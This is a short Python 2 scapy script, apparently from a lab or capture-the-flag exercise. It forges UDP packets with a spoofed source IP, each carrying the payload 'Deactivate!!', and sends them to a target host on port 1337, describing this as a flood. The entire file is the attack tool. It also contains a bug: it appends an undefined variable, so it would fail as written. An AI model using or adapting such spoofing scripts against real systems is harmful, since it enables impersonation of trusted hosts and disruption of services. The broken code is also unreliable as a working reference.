from scapy.all import *
from scapy.layers.inet import *


target = "10.12.1.4"
spoof = "10.204.0.7"
payload = "Deactivate!!"
packets = []

def packet_craft(source_port):
    pkt = IP(src=spoof, dst=target)/UDP(sport=source_port, dport=1337)/payload
    return pkt


print "Beginning packet crafting ...\n"

for i in range(10):
    source_port = random.randint(1024, 65535)
    temp_packet = packet_craft(source_port)
    packets.append(packet)

print "done crafting packets!\n"
print "\nBeginning flood ...\n"

for p in packets:
    send(p)

print "Done flooding!\n"


